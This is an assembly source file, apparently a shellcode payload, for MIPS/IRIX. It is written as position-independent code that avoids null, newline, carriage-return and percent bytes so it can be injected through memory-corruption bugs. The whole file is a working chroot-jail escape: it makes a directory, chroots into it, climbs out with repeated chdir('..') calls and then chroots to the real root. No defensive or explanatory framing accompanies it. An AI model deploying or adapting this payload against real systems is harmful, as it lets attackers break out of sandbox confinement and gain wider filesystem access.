/* MIPS/IRIX PIC chroot break
 * without 0x00, 0x0a, 0x0d, 0x25
 *
 * -sc.
 */

#include <sgidefs.h>
#include <sys/regdef.h>
#include <sys/asm.h>
#include <sys.s>
#include <sys/syscall.h>

	.section .text

	.globl	cbegin
	.globl	cend

cbegin:
	.set	noreorder
	.set	nomacro

foo:	bltzal	zero, foo
	li	a1, 0700	/* a1 = 0700 permission */

	/* mkdir ("Y..", 0700);
	 */
	lui	t2, 0x592e
	ori	t2, 0x2cff	/* t1 = "Y..\x00" */
	add	t2, t2, 0x0101
	sw	t2, -48(ra)

	subu	a0, ra, 48	/* a0 = "Y.." */
	li	v0, SYS_mkdir	/* 0x0438 */
	syscall

	/* chroot ("Y..");
	 * a0 still points to it
	 */
	addu	v0, a1, (SYS_chroot - 0700)	/* v0 = SYS_chroot (0x0425) */
	syscall

	/* chdir ("..") a few times
	 */
	li	s2, 0x1211	/* 12 times chdir ("..") */

foo2:	subu	a0, ra, 47	/* "..\x00" */
	li	v0, SYS_chdir	/* 0x03f4 */
	syscall
	sub	s2, 0x0101
	bgez	s2, foo2

	addu	v0, s2, 0x0426	/* bds: SYS_chroot (0x0425) + 1 */
	subu	a0, ra, 46	/* ".\x00" */
	syscall
	li	t2, 0x7350	/* NOP */

	.end	cbegin
cend:
	nop

